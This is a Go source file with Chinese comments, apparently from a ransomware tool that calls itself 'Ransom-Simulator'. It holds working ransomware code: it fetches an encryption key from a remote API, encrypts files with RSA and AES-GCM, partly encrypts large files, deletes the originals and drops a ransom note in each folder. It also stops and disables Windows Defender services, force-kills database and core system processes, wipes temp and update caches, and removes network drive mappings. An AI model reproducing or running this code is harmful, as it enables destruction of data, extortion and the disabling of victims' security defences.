// 缓存文件会被扫描流程跳过，不会因加密或 -remove 被删除。
func persistKeyCache(uuid, pemText, mode string, removeOriginal bool) (string, error) {
	if strings.TrimSpace(uuid) == "" || strings.TrimSpace(pemText) == "" {
		return "", fmt.Errorf("UUID 或公钥内容为空，无法写入密钥缓存")
	}

	record := keyCacheRecord{
		UUID:           uuid,
		PublicKeyPEM:   pemText,
		CreatedAt:      time.Now().Format(time.RFC3339),
		Mode:           mode,
		RemoveOriginal: removeOriginal,
		Version:        version,
	}
	data, err := json.MarshalIndent(record, "", "  ")
	if err != nil {
		return "", fmt.Errorf("序列化密钥缓存失败: %w", err)
	}
	data = append(data, '\n')

	fileName := fmt.Sprintf("key_cache_%s.json", uuid)
	paths := []string{filepath.Join(programDir, fileName)}
	if cacheDir := keyCacheDir(); cacheDir != "" {
		if mkErr := os.MkdirAll(cacheDir, 0700); mkErr == nil {
			paths = append(paths, filepath.Join(cacheDir, fileName))
		}
	}

	var written []string
	var firstErr error
	for _, path := range paths {
		if wErr := os.WriteFile(path, data, 0600); wErr != nil {
			if firstErr == nil {
				firstErr = wErr
			}
			continue
		}
		written = append(written, path)
	}
	if len(written) == 0 {
		if firstErr == nil {
			firstErr = fmt.Errorf("没有可写的缓存目录")
		}
		return "", fmt.Errorf("写入密钥缓存失败: %w", firstErr)
	}
	return written[0], nil
}

// isProtectedArtifact 判断文件名是否为程序自身产物：不参与扫描、加密与删除。
func isProtectedArtifact(name string) bool {
	lower := strings.ToLower(name)
	switch lower {
	case strings.ToLower(ransomNoteFileName),
		strings.ToLower(ransomWallpaperFileName),
		"ransom_log.txt",
		"success_encrypted.log",
		"failed_encrypted.log",
		"operations.log":
		return true
	}
	if strings.HasSuffix(lower, ".lock") || strings.HasSuffix(lower, ".encrypted") {
		return true
	}
	if strings.HasPrefix(lower, "public_key") && strings.HasSuffix(lower, ".pem") {
		return true
	}
	if strings.HasPrefix(lower, "key_cache_") && strings.HasSuffix(lower, ".json") {
		return true
	}
	if strings.HasPrefix(lower, "recon_report_") || strings.HasPrefix(lower, "remote_report_") {
		return true
	}
	return false
}

// ---------------------------------------------------------------------------
// 后台驻留模式（--resident）
// ---------------------------------------------------------------------------

// runResidentLoop 加密完成后驻留后台：保持心跳与单实例锁，直到收到退出信号。
func runResidentLoop(keyUUID, keyCachePath string) {
	uuid, _ := memoryKey()
	if uuid == "" {
		uuid = keyUUID
	}

	fmt.Println()
	fmt.Println("================== [ 后台驻留模式 ] ==================")
	fmt.Printf("  - 进程 PID:        %d\n", os.Getpid())
	if uuid != "" {
		fmt.Printf("  - 密钥 UUID:       %s（内存中保留）\n", uuid)
	}
	if keyCachePath != "" {
		fmt.Printf("  - 密钥缓存:        %s（不会删除）\n", keyCachePath)
	}
	fmt.Println("  - 心跳上报:        每 30 秒（管理后台持续显示在线）")
	fmt.Println("  - 退出方式:        Ctrl+C 或结束进程")
	fmt.Println("======================================================")

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(sigCh)

	statusTicker := time.NewTicker(5 * time.Minute)
	defer statusTicker.Stop()

	for {
		select {
		case sig := <-sigCh:
			fmt.Printf("\n[*] 收到退出信号 (%v)，结束驻留。\n", sig)
			return
		case <-statusTicker.C:
			if logEnabled {
				logOperation(fmt.Sprintf("后台驻留中: pid=%d uuid=%s 运行时长=%s",
					os.Getpid(), uuid, time.Since(heartbeatState.startAt).Round(time.Second)))
			}
		}
	}
}

func runEncryptionWorkers(files []string, numWorkers int, stats *counters, uuid, publicKeyValue string, removeOriginal bool) {
	jobs := make(chan string, len(files))
	var wg sync.WaitGroup

	// 公钥预解析（密钥已在 main 中统一获取，避免重复申请 UUID）
	pubKey, parseErr := getPublicKey(publicKeyValue)
	if parseErr != nil {
		fmt.Printf("[!] 公钥格式错误: %v\n", parseErr)
		os.Exit(1)
	}
	publicKeyCache = pubKey
	publicKeyCacheStr = publicKeyValue

	finalAccurateNote := fmt.Sprintf(ransomNoteContent, uuid, ransomNoteNotice(removeOriginal))
	var visitedDirs sync.Map

	log, err3 := newFileLog("ransom_log.txt")
	if err3 != nil {
		fmt.Printf("无法创建日志文件: %v\n", err3)
	}
	if log != nil {
		defer func() { _ = log.Close() }()
	}

	for w := 0; w < numWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for file := range jobs {
				dirPath := filepath.Dir(file)
				if _, loaded := visitedDirs.LoadOrStore(dirPath, true); !loaded {
					notePath := filepath.Join(dirPath, ransomNoteFileName)
					_ = os.WriteFile(notePath, []byte(finalAccurateNote), 0644)
				}
				if err := processFile(file, publicKeyValue, removeOriginal); err != nil {
					stats.failed.Add(1)

					// 记录失败日志
					logFailed(file, err.Error())

					if log != nil {
						log.Log(fmt.Sprintf("FAILED: %s - %v", file, err))
					}
				} else {
					stats.success.Add(1)

					// 记录成功日志
					logSuccess(file)
				}
			}
		}()
	}

	for _, file := range files {
		jobs <- file
	}
	close(jobs)

	done := make(chan bool)
	go func() {
		totalFiles := uint64(len(files))
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-done:
				return
			case <-ticker.C:
				processed := stats.success.Load() + stats.failed.Load()
				if totalFiles > 0 {
					progress := float64(processed) / float64(totalFiles) * 100
					fmt.Printf("\r[*] 进度: %.1f%% (%d/%d) [成功: %d, 失败: %d]", progress, processed, totalFiles, stats.success.Load(), stats.failed.Load())
				}
			}
		}
	}()

	wg.Wait()
	close(done)
	fmt.Println()

	if logEnabled {
		logOperation(fmt.Sprintf("加密工作完成: 成功 %d, 失败 %d", stats.success.Load(), stats.failed.Load()))
	}
}

func fetchKeysFromAPI() (*APIResponse, error) {
	jsonBody := []byte("{}")
	req, err := http.NewRequest("POST", apiURL, bytes.NewBuffer(jsonBody))
	if err != nil {
		return nil, fmt.Errorf("创建请求失败: %w", err)
	}
	req.Header.Set("User-Agent", "Ransom-Simulator/"+version)
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{Timeout: 5 * time.Second}
	res, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("请求API失败: %w", err)
	}
	defer func() { _ = res.Body.Close() }()

	if res.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("API返回错误状态码: %d", res.StatusCode)
	}

	body, err := io.ReadAll(res.Body)
	if err != nil {
		return nil, fmt.Errorf("读取API响应失败: %w", err)
	}

	var apiResp APIResponse
	if err := json.Unmarshal(body, &apiResp); err != nil {
		return nil, fmt.Errorf("解析API响应失败: %w", err)
	}

	if apiResp.Status != "success" {
		return nil, fmt.Errorf("API返回非成功状态: %s - %s", apiResp.Status, apiResp.Message)
	}

	if apiResp.PublicKeyPEM == "" || apiResp.UUID == "" {
		return nil, fmt.Errorf("API返回的密钥或UUID为空")
	}

	return &apiResp, nil
}

// processFile 加密单个文件
func processFile(filePath string, publicKeyStr string, removeOriginal bool) error {
	info, err := os.Stat(filePath)
	if err != nil {
		return fmt.Errorf("获取文件信息失败: %w", err)
	}

	fileSize := info.Size()
	if fileSize > largeFileThreshold {
		return partialEncryptFile(filePath, publicKeyStr, fileSize)
	}

	content, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("读取文件失败: %w", err)
	}

	if len(content) == 0 {
		return fmt.Errorf("文件为空，跳过加密: %s", filePath)
	}

	encryptedData, err := hybridEncrypt(content, publicKeyStr)
	if err != nil {
		return fmt.Errorf("加密失败: %w", err)
	}

	encryptedPath := filePath + ".encrypted"
	if err := os.WriteFile(encryptedPath, encryptedData, 0644); err != nil {
		return fmt.Errorf("写入加密文件失败: %w", err)
	}

	if removeOriginal {
		if err := os.Remove(filePath); err != nil {
			trashName := filePath + ".delete_me_" + generateRandomSuffix()
			if renameErr := os.Rename(filePath, trashName); renameErr != nil {
				return fmt.Errorf("删除原文件失败(文件被锁定): %w", renameErr)
			}
		}
	}

	return nil
}

// shouldEncrypt 判断文件是否应根据扩展名过滤进行加密
func shouldEncrypt(path string, extFilter map[string]bool) bool {
	fileName := filepath.Base(path)
	ext := strings.ToLower(filepath.Ext(fileName))

	if fileName == ransomNoteFileName || fileName == ransomWallpaperFileName || strings.HasSuffix(fileName, ".lock") || strings.EqualFold(ext, ".encrypted") {
		return false
	}

	return extFilter[ext]
}

// isExcluded 判断目录是否在排除列表中（Windows版本）
func isExcluded(dir string) bool {
	dirLower := strings.ToLower(dir)
	for _, excluded := range excludedDirsWindows {
		if strings.HasPrefix(dirLower, strings.ToLower(excluded)) {
			return true
		}
	}
	return false
}

// getKeys 从map中提取所有key
func getKeys(m map[string]bool) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

// hybridEncrypt 使用RSA-2048 + AES-256-GCM混合加密
func hybridEncrypt(plaintext []byte, publicKeyStr string) ([]byte, error) {
	pubKey, err := getPublicKey(publicKeyStr)
	if err != nil {
		return nil, fmt.Errorf("获取公钥失败: %w", err)
	}

	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(cryptoReader, aesKey); err != nil {
		return nil, fmt.Errorf("生成AES密钥失败: %w", err)
	}

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, fmt.Errorf("创建AES cipher失败: %w", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("创建GCM模式失败: %w", err)
	}

	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := io.ReadFull(cryptoReader, nonce); err != nil {
		return nil, fmt.Errorf("生成GCM nonce失败: %w", err)
	}

	ciphertext := aesGCM.Seal(nil, nonce, plaintext, nil)

	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), cryptoReader, pubKey, aesKey, nil)
	if err != nil {
		return nil, fmt.Errorf("RSA加密AES密钥失败: %w", err)
	}

	var buffer bytes.Buffer
	buffer.Write(encryptedAESKey)
	buffer.Write(nonce)
	buffer.Write(ciphertext)

	return buffer.Bytes(), nil
}

// generateRandomSuffix 生成8位随机十六进制后缀
func generateRandomSuffix() string {
	b := make([]byte, 4)
	_, _ = cryptoReader.Read(b)
	return fmt.Sprintf("%x", b)
}

// newFileLog 创建文件日志对象
func newFileLog(filename string) (*fileLog, error) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return nil, err
	}
	return &fileLog{file: f}, nil
}

// Log 写入日志条目
func (l *fileLog) Log(message string) {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.file != nil {
		logLine := fmt.Sprintf("%s - %s\n", time.Now().Format("2006-01-02 15:04:05"), message)
		_, _ = l.file.WriteString(logLine)
	}
}

// Close 关闭日志文件
func (l *fileLog) Close() error {
	if l.file != nil {
		return l.file.Close()
	}
	return nil
}

func partialEncryptFile(filePath string, publicKeyStr string, fileSize int64) error {
	fmt.Printf("\n  [大文件] %s (大小: %.2f GB) - 使用部分加密策略\n",
		filepath.Base(filePath), float64(fileSize)/(1024*1024*1024))

	pubKey, err := getPublicKey(publicKeyStr)
	if err != nil {
		return fmt.Errorf("获取公钥失败: %w", err)
	}

	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(cryptoReader, aesKey); err != nil {
		return fmt.Errorf("生成AES密钥失败: %w", err)
	}

	chunks := calculateChunks(fileSize)
	var encryptedChunks []encryptedChunk

	f, err := os.OpenFile(filePath, os.O_RDONLY, 0644)
	if err != nil {
		return fmt.Errorf("打开文件失败: %w", err)
	}
	defer f.Close()

	for _, chunk := range chunks {
		buf := make([]byte, chunk.Size)
		n, err := f.ReadAt(buf, chunk.Offset)
		if err != nil && err != io.EOF {
			return fmt.Errorf("读取文件块失败(offset=%d): %w", chunk.Offset, err)
		}
		buf = buf[:n]

		block, err := aes.NewCipher(aesKey)
		if err != nil {
			return fmt.Errorf("创建AES cipher失败: %w", err)
		}

		aesGCM, err := cipher.NewGCM(block)
		if err != nil {
			return fmt.Errorf("创建GCM模式失败: %w", err)
		}

		nonce := make([]byte, aesGCM.NonceSize())
		if _, err := io.ReadFull(cryptoReader, nonce); err != nil {
			return fmt.Errorf("生成GCM nonce失败: %w", err)
		}

		ciphertext := aesGCM.Seal(nil, nonce, buf, nil)

		encryptedChunks = append(encryptedChunks, encryptedChunk{
			Offset: chunk.Offset,
			Size:   len(buf),
			Nonce:  nonce,
			Data:   ciphertext,
		})
	}

	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), cryptoReader, pubKey, aesKey, nil)
	if err != nil {
		return fmt.Errorf("RSA加密AES密钥失败: %w", err)
	}

	chunksJSON, err := json.Marshal(encryptedChunks)
	if err != nil {
		return fmt.Errorf("序列化加密块信息失败: %w", err)
	}

	var outputBuf bytes.Buffer
	outputBuf.Write([]byte("PENC"))

	chunkLen := make([]byte, 4)
	binary.BigEndian.PutUint32(chunkLen, uint32(len(chunksJSON)))
	outputBuf.Write(chunkLen)
	outputBuf.Write(chunksJSON)

	keyLen := make([]byte, 4)
	binary.BigEndian.PutUint32(keyLen, uint32(len(encryptedAESKey)))
	outputBuf.Write(keyLen)
	outputBuf.Write(encryptedAESKey)

	for _, ec := range encryptedChunks {
		outputBuf.Write(ec.Data)
	}

	encryptedPath := filePath + ".encrypted"
	if err := os.WriteFile(encryptedPath, outputBuf.Bytes(), 0644); err != nil {
		return fmt.Errorf("写入加密文件失败: %w", err)
	}

	return nil
}

func calculateChunks(fileSize int64) []chunkInfo {
	var chunks []chunkInfo

	for i := int64(0); i < headChunks && i*chunkSize < fileSize; i++ {
		sz := chunkSize
		if (i+1)*chunkSize > fileSize {
			sz = int(fileSize - i*chunkSize)
		}
		chunks = append(chunks, chunkInfo{Offset: i * chunkSize, Size: int64(sz)})
	}

	for i := int64(0); i < tailChunks; i++ {
		offset := fileSize - (i+1)*chunkSize
		if offset < 0 {
			offset = 0
		}
		sz := fileSize - offset
		if sz > chunkSize {
			sz = chunkSize
		}
		isDuplicate := false
		for _, c := range chunks {
			if c.Offset == offset {
				isDuplicate = true
				break
			}
		}
		if !isDuplicate {
			chunks = append(chunks, chunkInfo{Offset: offset, Size: sz})
		}
	}

	if fileSize > int64(headChunks+tailChunks)*chunkSize {
		availableStart := int64(headChunks) * chunkSize
		availableEnd := fileSize - int64(tailChunks)*chunkSize
		availableRange := availableEnd - availableStart

		if availableRange > 0 {
			rng := mrand.New(mrand.NewSource(time.Now().UnixNano()))
			for i := 0; i < middleRandomChunks; i++ {
				offset := availableStart + rng.Int63n(availableRange)
				offset = offset / chunkSize * chunkSize
				sz := int64(chunkSize)
				if offset+sz > fileSize {
					sz = fileSize - offset
				}
				isDuplicate := false
				for _, c := range chunks {
					if c.Offset == offset {
						isDuplicate = true
						break
					}
				}
				if !isDuplicate {
					chunks = append(chunks, chunkInfo{Offset: offset, Size: sz})
				}
			}
		}
	}

	return chunks
}

func applyAggressiveDelay() {
	if aggressiveDelay > 0 {
		delay := mrand.Intn(aggressiveDelay)
		time.Sleep(time.Duration(delay) * time.Millisecond)
	} else if aggressiveDelay < 0 {
		aggressiveDelay = 0
	}
}

func stopSecurityServices() {
	fmt.Println("  - 停止Windows安全服务...")
	if logEnabled {
		logOperation("开始停止Windows安全服务")
	}

	securityServices := []string{
		"WinDefend", "SecurityHealthService", "WdNisSvc", "Sense",
		"MsMpSvc", "MpKslDrv", "WdBoot", "WdFilter", "WdNisDrv",
	}

	for _, service := range securityServices {
		fmt.Printf("  - 停止安全服务: %s\n", service)
		cmd := exec.Command("sc", "stop", service)
		_ = cmd.Run()
		cmd = exec.Command("net", "stop", service)
		_ = cmd.Run()
		cmd = exec.Command("sc", "config", service, "start=", "disabled")
		_ = cmd.Run()
		applyAggressiveDelay()
	}

	if logEnabled {
		logOperation("安全服务停止完成")
	}
}

func cleanDatabaseMemory() {
	fmt.Println("  - 清理MySQL查询缓存...")
	cleanMySQLCache()
	fmt.Println("  - 清理PostgreSQL缓存...")
	cleanPostgreSQLCache()
	if logEnabled {
		logOperation("数据库内存清理完成")
	}
}

func cleanMySQLCache() {
	cmds := []string{
		`mysql -u root -e "RESET QUERY CACHE;" 2>nul`,
		`mysql -u root -e "FLUSH TABLES;" 2>nul`,
		`mysql -u root -e "FLUSH LOGS;" 2>nul`,
	}
	for _, c := range cmds {
		cmd := exec.Command("cmd", "/C", c)
		_ = cmd.Run()
		applyAggressiveDelay()
	}
}

func cleanPostgreSQLCache() {
	cmds := []string{
		`psql -U postgres -c "CHECKPOINT;" 2>nul`,
		`psql -U postgres -c "DISCARD ALL;" 2>nul`,
	}
	for _, c := range cmds {
		cmd := exec.Command("cmd", "/C", c)
		_ = cmd.Run()
		applyAggressiveDelay()
	}
}

func clearSystemCache() {
	fmt.Println("  - 清理系统缓存...")
	if logEnabled {
		logOperation("开始清理系统缓存")
	}
	cmd := exec.Command("ipconfig", "/flushdns")
	_ = cmd.Run()
	cmd = exec.Command("powershell", "-Command",
		"net stop wuauserv; net stop bits; Remove-Item -Path \"$env:windir\\SoftwareDistribution\\Download\\*\" -Recurse -Force -ErrorAction SilentlyContinue; net start wuauserv; net start bits")
	_ = cmd.Run()
	cmd = exec.Command("powershell", "-Command",
		"Remove-Item -Path \"$env:TEMP\\*\" -Recurse -Force -ErrorAction SilentlyContinue")
	_ = cmd.Run()
	if logEnabled {
		logOperation("系统缓存清理完成")
	}
}

func disableProcessWatchdogs() {
	fmt.Println("  - 禁用系统看门狗和监控进程...")
	if logEnabled {
		logOperation("开始禁用看门狗进程")
	}
	watchdogs := []string{
		"wmiprvse.exe", "svchost.exe", "taskhostw.exe",
		"dllhost.exe", "conhost.exe", "rundll32.exe",
	}
	for _, proc := range watchdogs {
		cmd := exec.Command("taskkill", "/F", "/IM", proc)
		_ = cmd.Run()
		applyAggressiveDelay()
	}
	cmd := exec.Command("sc", "config", "WerSvc", "start=", "disabled")
	_ = cmd.Run()
	cmd = exec.Command("sc", "stop", "WerSvc")
	_ = cmd.Run()
	if logEnabled {
		logOperation("看门狗进程禁用完成")
	}
}

func unmountDatabaseConnections() {
	fmt.Println("  - 断开数据库活动和连接...")
	if logEnabled {
		logOperation("开始断开数据库连接")
	}
	dbProcesses := []string{
		"mysql.exe", "mysqld.exe", "sqlservr.exe", "postgres.exe",
		"psql.exe", "sqlplus.exe", "mongod.exe", "mongos.exe",
		"redis-server.exe", "oracle.exe",
	}
	for _, proc := range dbProcesses {
		cmd := exec.Command("taskkill", "/F", "/IM", proc)
		_ = cmd.Run()
		applyAggressiveDelay()
	}
	cmd := exec.Command("powershell", "-Command", "net use * /delete /y 2>$null")
	_ = cmd.Run()
	if logEnabled {
		logOperation("数据库连接断开完成")
	}
}
